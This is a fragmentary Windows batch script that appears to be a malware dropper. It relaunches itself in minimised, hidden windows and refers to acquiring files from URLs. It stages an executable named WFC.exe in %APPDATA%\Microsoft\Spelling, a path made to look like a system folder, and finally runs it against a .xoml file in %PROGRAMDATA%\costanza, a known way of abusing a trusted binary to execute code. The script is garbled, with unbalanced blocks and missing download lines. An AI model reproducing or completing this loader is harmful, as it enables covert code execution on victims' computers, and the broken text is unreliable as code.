@echo off
setlocal EnableDelayedExpansion

REM ---- Minimize window on first launch ----
if defined __CW_MIN__ goto :min_done
set "__CW_MIN__=1"
start "" /min cmd /c "%~f0" %*
exit /b 0
:min_done

REM ---- Child-process restart (hidden window) ----
if "%~1"=="__spawned__" goto :main

REM ---- Auto-generated script ----
REM Files are processed in order. After each acquisition
REM the script restarts so every file is re-verified.

:main

REM ---- File 1 ----

    goto :file1_done
)

    if not exist "%%~dpF" mkdir "%%~dpF"
)

    del "%APPDATA%\Microsoft\Spelling\WFC.exe" 2>nul
    goto :file1_urls_failed
)
goto :file1_ok

:file1_urls_failed
exit /b 1

:file1_ok
if not defined __CW_CHILD__ goto :file1_spawn
call "%~f0" %*
goto :eof
:file1_spawn
set "__CW_CHILD__=1"
start "" /min /wait cmd /c "%~f0" __spawned__
set "__CW_CHILD__="
goto :file1_done

    goto :file2_urls_failed

:file2_ok
if not defined __CW_CHILD__ goto :file2_spawn

:file2_spawn

start "" /min cmd /c "%~f0" __spawned__
exit /b 0

REM ---- Final commands ----
%APPDATA%\Microsoft\Spelling\WFC.exe %PROGRAMDATA%\costanza\index.xoml
